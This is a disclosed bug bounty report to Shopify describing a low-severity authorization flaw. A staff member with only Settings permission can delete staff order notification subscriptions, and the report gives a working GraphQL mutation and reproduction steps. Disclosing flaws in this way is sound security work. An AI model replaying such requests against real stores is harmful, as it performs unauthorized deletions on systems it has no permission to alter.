# staffOrderNotificationSubscriptionDelete Could Be Used By Staff Member With Settings Permission

## Report Details
- **Report ID**: 1102660
- **URL**: https://hackerone.com/reports/1102660
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-02-13T10:35:04.708Z
- **Disclosed**: 2022-02-09T20:59:25.561Z

## Reporter
- **Username**: ngalog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

The staff order notification should be under the control of staff members with `Order` permission but I found that the staff member with just `Settings` permission can also delete the order notifications using the GID

Steps to reproduce
- Login as a staff member with `Settings` permission
- Make this GraphQL call to `https://yoursubdomain.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores`

```
{"query": "mutation{staffOrderNotificationSubscriptionDelete(staffOrderNotificationSubscriptionId:\"gid://shopify/StaffOrderNotificationSubscription/82867191864\"){userErrors{message}}} "}
```

- Note: you can find the `82867191864` id from `/admin/settings/notifications` as an admin account, in the `Staff order notifications` section, after adding a order notification and the id is in the URL

- The response you see should be `{"staffOrderNotificationSubscriptionDelete":{"userErrors":[]}}`, and this means you have deleted the subscription already

## Impact

The staff order notification should be under the control of staff members with `Order` permission but I found that the staff member with just `Settings` permission can also delete the order notifications using the GID

## Attachments
No attachments
